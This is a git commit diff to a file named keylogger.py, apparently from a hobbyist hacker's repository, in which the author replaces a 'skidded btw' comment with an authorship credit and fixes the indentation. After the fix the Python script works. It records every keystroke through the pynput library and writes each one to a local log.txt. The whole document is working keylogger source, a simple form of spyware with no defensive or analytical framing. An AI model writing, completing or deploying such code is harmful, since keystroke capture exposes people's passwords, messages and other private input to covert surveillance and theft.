6ee0978f68baf7a6f4d1f29273b0f82a3a5f2ae4
mucatws <samuelfreitascostagg@gmail.com>
2026-05-06 18:14:00 -0300

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,13 +1,13 @@
-# skidded btw
+#coded by leosec aka mucatws
 
 import pynput
 
 with open("log.txt", "w") as log:
     log.write("")
 
-    def on_press(key):
-        with open("log.txt", "a") as log:
-            log.write(f"{key}\n")
+def on_press(key):
+    with open("log.txt", "a") as log:
+        log.write(f"{key}\n")
 
-            with pynput.keyboard.Listener(on_press=on_press) as listener:
-                listener.join()
+with pynput.keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
